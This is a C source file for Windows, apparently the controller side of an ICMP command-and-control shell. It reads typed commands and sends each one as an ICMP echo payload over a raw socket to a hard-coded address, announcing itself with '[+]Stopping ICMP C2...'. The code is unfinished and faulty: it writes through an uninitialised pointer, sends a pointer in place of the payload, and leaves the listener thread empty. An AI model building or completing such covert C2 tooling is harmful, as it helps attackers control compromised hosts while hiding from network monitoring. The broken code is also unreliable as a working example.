#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <ws2tcpip.h>

#define ICMP_ID 13170
#define DEST_ADDR "192.168.147.109"     

struct sockaddr_in dest_addr;
struct sockaddr_in source_addr;

struct icmp_hdr {
    uint8_t type;
    uint8_t code;
    uint16_t checksum;
    uint16_t id;
    uint16_t seq;
};

struct icmp_packet {
    struct icmp_hdr icmp_header;
    char* payload;
};

struct ip_hdr {
    uint8_t version_ihl;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_offset;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t checksum;
    uint32_t saddr;
    uint32_t daddr;
};


unsigned short icmp_checksum(unsigned short *addr, int len)
{
    printf("hi\n");
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    /* 
     * The checksum is the 16-bit ones's complement of the one's
     * complement sum of the ICMP message starting with the ICMP Type.
     * For computing the checksum , the checksum field should be zero. 
     */

    while(nleft > 1) {
        printf("Sum:%ld", sum);
        sum += *w++;
        nleft -= 2;
    }

    if( nleft == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    printf("ICMP checksum:%hu\n", answer);
    return answer;
}


bool send_icmp_packet(int socket, char *icmp_shell, int packet_seq) {
    /*
    size_t packet_size = sizeof(struct ip_hdr) + sizeof(struct icmp_hdr) + sizeof(payload);
    char *packet = malloc(packet_size);
    struct ip_hdr *ip = (struct ip_hdr*) packet;
    struct icmp_hdr *icmp = (struct imcp_hdr*) (packet + sizeof(struct ip_hdr)); 
    char *payload = (char *) (packet + sizeof(struct ip_hdr) + sizeof(struct icmp_hdr));

    ip->ihl      = 5;
    ip->version  = 4;
    ip->tos      = 16;
    ip->tot_len  = packet_size;
    ip->id       = htons(54321);
    ip->ttl      = 64; 
    ip->protocol = 1; // UDP
    ip->frag_offset = 0; // Handled automatically
    ip->checksum;
    ip->saddr;
    ip->daddr;
    */

/*
    char *packet = malloc(sizeof(struct icmp_hdr) + strlen(icmp_shell));
    struct icmp_hdr *icmp = (struct imcp_hdr*) (packet); 
    char *payload = (char *) (packet + sizeof(struct icmp_hdr));
*/

    struct icmp_packet *packet;
    memset(packet, 0, sizeof(struct icmp_packet));
    packet->icmp_header.type = 8;
    packet->icmp_header.code = 0;
    packet->icmp_header.seq = packet_seq;
    packet->icmp_header.id = ICMP_ID;
    packet->payload = malloc(strlen(icmp_shell));
    memcpy(packet->payload, icmp_shell, strlen(icmp_shell));
    printf("a\n");
    packet->icmp_header.checksum = icmp_checksum((unsigned short *)packet, sizeof(struct icmp_hdr) + strlen(packet->payload)); // TBD 
    printf("aa\n");
    //printf("Size: %ld\n", str));

    int result = sendto(socket, (char *)packet, sizeof(struct icmp_hdr) + strlen(packet->payload), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)); 
    if (result < 0) {
    printf("Error: %ld\n", GetLastError());
    }  
    printf("Payload: %s\n", packet->payload);
    printf("Packet: %s\n", (char *)packet);
    //sleep(1);
    return true; 
}


DWORD WINAPI IcmpSniffer(LPVOID lpParam) {

}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WSADATA ver;
    WSAStartup(MAKEWORD(2,2), &ver);

    bzero(&dest_addr, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(DEST_ADDR);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP); 
    if (sock < 0) {
        printf("Error: %ld\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    //int on = 1;
    //setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));

    HANDLE hThread = CreateThread(NULL, 0, IcmpSniffer, NULL, 0, NULL);

    char icmp_shell[100];
    char exit_string[] = "exit\n";
    int packet_seq = 0;
    while (true) {
        printf("A\n");
        fgets(icmp_shell, sizeof(icmp_shell), stdin);
        printf("%s\n", icmp_shell);
        if (strcmp(icmp_shell, exit_string) == 0) {
            printf("[+]Stopping ICMP C2...\n");
            WaitForSingleObject(hThread, 1);
            CloseHandle(hThread);
            break;
        } else if (strcmp(icmp_shell, "\n") == 0) {
            continue;
        } else {
            printf("B\n");
            if (send_icmp_packet(sock, icmp_shell, packet_seq)) {
                packet_seq++;
            }
            // Send ICMP packet as payload
        }
    }
}












